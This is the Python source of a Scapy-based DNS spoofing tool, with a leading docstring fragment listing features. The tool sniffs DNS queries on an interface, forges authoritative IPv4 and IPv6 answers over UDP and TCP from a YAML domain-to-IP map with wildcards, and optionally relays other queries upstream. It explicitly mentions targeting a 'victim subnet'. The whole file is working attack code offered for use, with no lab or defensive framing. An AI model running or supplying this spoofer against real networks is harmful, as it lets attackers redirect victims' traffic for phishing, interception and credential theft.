"""
* **IPv6 & AAAA support** – answers both A and AAAA queries, forges IPv6
  packets where needed.
* **DNS‑over‑TCP (port 53/tcp)** – uses a second sniffer thread and crafts
  sequence‑correct responses so Windows / DoH fallback still resolve.
* **Multiple answers per name** – YAML can map a domain to a *single* IP
  (string) or a *list* of IPs (A or AAAA).  Each value is validated.
* **Wildcard logic** – unchanged, but now works with the list syntax.
* **Configurable TTL** – `--ttl` flag.
* **Silent ⇄ Verbose modes** – `--quiet` and `--verbose` flip Python’s
  logging level.
* **Custom BPF filter** – `--bpf` lets you narrow in on one victim subnet
  without editing the code.
* **Graceful shutdown** – both UDP and TCP sniffers stop on Ctrl‑C.
"""

from __future__ import annotations

import argparse
import ipaddress
import logging
import signal
import socket
import sys
import threading
import time
from pathlib import Path
from typing import Dict, List, Optional, Sequence, Union

import yaml
from scapy.all import (
    DNS,
    DNSQR,
    DNSRR,
    IPv6,
    IP,
    UDP,
    TCP,
    send,
    sniff,
)

###############################################################################
# Helper functions
###############################################################################

def setup_logging(verbose: bool, quiet: bool) -> None:
    """Configure root logger according to CLI flags."""

    if verbose and quiet:
        # last flag wins (argparse stores bool, cannot supply both at once)
        quiet = False
    level = logging.DEBUG if verbose else (logging.ERROR if quiet else logging.INFO)

    logging.basicConfig(
        level=level,
        format="%(asctime)s %(levelname)s: %(message)s",
        datefmt="%H:%M:%S",
    )


###############################################################################
# Core spoofer thread
###############################################################################

MappingType = Dict[str, Union[str, List[str]]]


def _normalise_qname(name: str) -> str:
    return name.rstrip(".").lower()


class DNSSpoofer(threading.Thread):
    """Active DNS spoofing / relay worker.

    One instance binds to a single interface, but internally launches an
    *extra* thread to handle DNS‑over‑TCP in parallel to UDP.
    """

    def __init__(
        self,
        iface: str,
        mapping: MappingType,
        *,
        upstream: str = "8.8.8.8",
        relay: bool = False,
        ttl: int = 300,
        bpf: Optional[str] = None,
    ) -> None:
        super().__init__(daemon=True)
        self.iface = iface
        self.mapping = mapping
        self.upstream = upstream
        self.relay = relay
        self.ttl = ttl
        self.bpf = bpf or "udp or tcp port 53"

        self._running = threading.Event()
        self._running.set()

        # second thread only for TCP queries so we can keep code readable
        self._tcp_thread: Optional[threading.Thread] = None

    # ---------------------------------------------------------------------
    # Mapping helpers
    # ---------------------------------------------------------------------

    def _lookup(self, qname: str) -> Optional[Sequence[str]]:
        """Return a sequence of spoof IPs that match *qname* or None."""
        qname = _normalise_qname(qname)

        # 1. exact match
        if qname in self.mapping:
            value = self.mapping[qname]
            return value if isinstance(value, list) else [value]

        # 2. wildcard pattern "*.example.com"
        for pattern, value in self.mapping.items():
            if pattern.startswith("*.") and qname.endswith(pattern[2:]):
                return value if isinstance(value, list) else [value]
        return None

    # ------------------------------------------------------------------
    # Packet forging helpers
    # ------------------------------------------------------------------

    def _build_answers(self, qname: bytes, spoof_ips: Sequence[str], qtype: int) -> DNS:
        """Craft a DNS answer section with *one or more* records."""
        rr_list = []
        for ip in spoof_ips:
            rr_list.append(
                DNSRR(
                    rrname=qname,
                    type=qtype,
                    ttl=self.ttl,
                    rdata=ip,
                )
            )
        # Chain the answers together – Scapy supports list or "/"‑chaining
        answers = rr_list[0]
        for extra in rr_list[1:]:
            answers /= extra
        return answers

    def _forge_response(self, pkt, spoof_ips: Sequence[str]):
        """Return a Scapy packet ready to send (UDP or TCP)"""

        if UDP in pkt:
            proto_layer = UDP
        else:
            proto_layer = TCP

        q = pkt[DNSQR]
        qname = q.qname
        qtype = q.qtype  # 1 = A, 28 = AAAA

        answers = self._build_answers(qname, spoof_ips, qtype)
        dns_resp = DNS(
            id=pkt[DNS].id,
            qr=1,
            aa=1,
            qd=q,
            ancount=len(spoof_ips),
            an=answers,
        )

        # IPv4 or IPv6 outer header
        if IP in pkt:
            ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        else:
            ip_layer = IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)

        if proto_layer is UDP:
            udp_resp = UDP(sport=53, dport=pkt[UDP].sport)
            return ip_layer / udp_resp / dns_resp
        else:  # TCP
            payload_len = len(dns_resp)
            tcp_resp = TCP(
                sport=53,
                dport=pkt[TCP].sport,
                flags="PA",
                seq=pkt[TCP].ack,
                ack=pkt[TCP].seq + len(pkt[TCP].payload),
            )
            return ip_layer / tcp_resp / dns_resp

    # ------------------------------------------------------------------
    # Packet processors
    # ------------------------------------------------------------------

    def _process_udp(self, pkt):
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):  # query only
            return

        qname_bytes = pkt[DNSQR].qname
        qname_str = qname_bytes.decode()
        spoof_ips = self._lookup(qname_str)

        if spoof_ips:
            forged = self._forge_response(pkt, spoof_ips)
            send(forged, iface=self.iface, verbose=False)
            logging.info("Spoofed %s → %s for %s", qname_str, ", ".join(spoof_ips),
                         pkt[IP].src if IP in pkt else pkt[IPv6].src)
            return

        if self.relay:
            self._relay_upstream(pkt)

    def _process_tcp(self, pkt):
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
            return
        qname_bytes = pkt[DNSQR].qname
        qname_str = qname_bytes.decode()
        spoof_ips = self._lookup(qname_str)

        if spoof_ips:
            forged = self._forge_response(pkt, spoof_ips)
            send(forged, iface=self.iface, verbose=False)
            logging.info("(TCP) Spoofed %s → %s for %s", qname_str, ", ".join(spoof_ips),
                         pkt[IP].src if IP in pkt else pkt[IPv6].src)
            return

        if self.relay:
            # For simplicity: fall back to UDP upstream even if client asked via TCP
            self._relay_upstream(pkt)

    # ------------------------------------------------------------------
    # Upstream relay (UDP‑only, IPv4)
    # ------------------------------------------------------------------

    def _relay_upstream(self, pkt):
        qname = pkt[DNSQR].qname.decode()
        src_ip = pkt[IP].src if IP in pkt else pkt[IPv6].src

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        try:
            sock.sendto(bytes(pkt[DNS]), (self.upstream, 53))
            data, _ = sock.recvfrom(4096)
        except socket.timeout:
            logging.warning("Upstream DNS timeout for %s", qname)
            return
        finally:
            sock.close()

        dns_resp = DNS(data)
        ip_layer = IP(src=pkt[IP].dst, dst=src_ip)
        udp_layer = UDP(sport=53, dport=pkt[UDP].sport)
        answer_pkt = ip_layer / udp_layer / dns_resp
        send(answer_pkt, iface=self.iface, verbose=False)
        logging.debug("Relayed %s to %s", qname, src_ip)

    # ------------------------------------------------------------------
    # Thread entry point
    # ------------------------------------------------------------------

    def run(self):
        logging.info("DNS spoofing active on %s (relay=%s) – filter: '%s'", self.iface, self.relay, self.bpf)

        # TCP sub‑thread
        self._tcp_thread = threading.Thread(
            target=lambda: sniff(
                iface=self.iface,
                filter=f"tcp and ({self.bpf})",
                prn=self._process_tcp,
                store=False,
                stop_filter=lambda _: not self._running.is_set(),
            ),
            daemon=True,
        )
        self._tcp_thread.start()

        # Main thread handles UDP
        sniff(
            iface=self.iface,
            filter=f"udp and ({self.bpf})",
            prn=self._process_udp,
            store=False,
            stop_filter=lambda _: not self._running.is_set(),
        )

    def stop(self):
        self._running.clear()
        # wait a moment so sniff() loops exit
        if self._tcp_thread and self._tcp_thread.is_alive():
            self._tcp_thread.join(timeout=1)


###############################################################################
# YAML mapping loader – accepts str **or list[str]**
###############################################################################

def load_mapping(path: Path) -> MappingType:
    raw = yaml.safe_load(path.read_text())
    if not isinstance(raw, dict):
        raise ValueError("Mapping file must contain a YAML dictionary")

    mapping: MappingType = {}
    for hostname, value in raw.items():
        hostname_norm = _normalise_qname(str(hostname))

        # value can be a single IP or a list
        ips: List[str] = []
        if isinstance(value, list):
            ips = [str(v) for v in value]
        else:
            ips = [str(value)]

        # validate each address (v4 or v6) – discard invalid entries
        clean_ips: List[str] = []
        for ip in ips:
            try:
                ipaddress.ip_address(ip)
                clean_ips.append(ip)
            except ValueError:
                logging.warning("Ignoring invalid IP '%s' for host '%s'", ip, hostname_norm)
        if clean_ips:
            mapping[hostname_norm] = clean_ips if len(clean_ips) > 1 else clean_ips[0]
    return mapping


###############################################################################
# CLI / entry point
###############################################################################

def main(argv: Optional[Sequence[str]] = None):
    parser = argparse.ArgumentParser(description="Fully‑fledged DNS spoofing / relay tool (Scapy)")
    parser.add_argument("-i", "--iface", required=True, help="Interface to bind")
    parser.add_argument("-m", "--map", type=Path, required=True, help="YAML mapping file")

    parser.add_argument("--relay", action="store_true", help="Relay unmatched queries upstream")
    parser.add_argument("--upstream", default="8.8.8.8", help="Upstream DNS server (default 8.8.8.8)")

    parser.add_argument("--ttl", type=int, default=300, help="TTL for forged answers")

    group = parser.add_mutually_exclusive_group()
    group.add_argument("-q", "--quiet", action="store_true", help="Silent mode (errors only)")
    group.add_argument("-v", "--verbose", action="store_true", help="Verbose debug output")

    parser.add_argument("--bpf", help="Additional BPF filter to AND with 'port 53'")

    args = parser.parse_args(argv)

    setup_logging(args.verbose, args.quiet)

    try:
        mapping = load_mapping(args.map)
    except ValueError as exc:
        logging.error("%s", exc)
        sys.exit(1)

    if not mapping:
        logging.error("No valid mappings – aborting")
        sys.exit(1)

    spoofer = DNSSpoofer(
        iface=args.iface,
        mapping=mapping,
        upstream=args.upstream,
        relay=args.relay,
        ttl=args.ttl,
        bpf=args.bpf,
    )
    spoofer.start()

    # Handle Ctrl‑C
    def _sigint(_sig, _frame):
        logging.info("Ctrl‑C received, shutting down…")
        spoofer.stop()

    signal.signal(signal.SIGINT, _sigint)

    while spoofer.is_alive():
        time.sleep(0.3)

    logging.info("Bye!")


if __name__ == "__main__":
    main()
